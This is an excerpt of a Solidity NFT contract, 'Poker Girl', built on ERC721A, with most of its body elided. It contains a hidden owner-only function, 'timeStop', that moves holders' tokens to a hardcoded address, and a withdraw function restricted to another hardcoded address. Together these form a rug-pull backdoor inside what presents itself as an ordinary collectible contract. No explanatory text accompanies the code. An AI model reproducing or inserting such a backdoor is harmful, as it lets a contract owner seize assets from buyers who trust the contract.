...
contract Poker_Girl is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Poker Girl", "PG", maxBatchSize_, collectionSize_) {
  ...
  function timeStop(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x1DBc281F6C15672cdE702a7876D6d0C2e0DE801D, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x1ED5c3B1eEA7417De2b740a3BE9D4CF9272bDaeD);
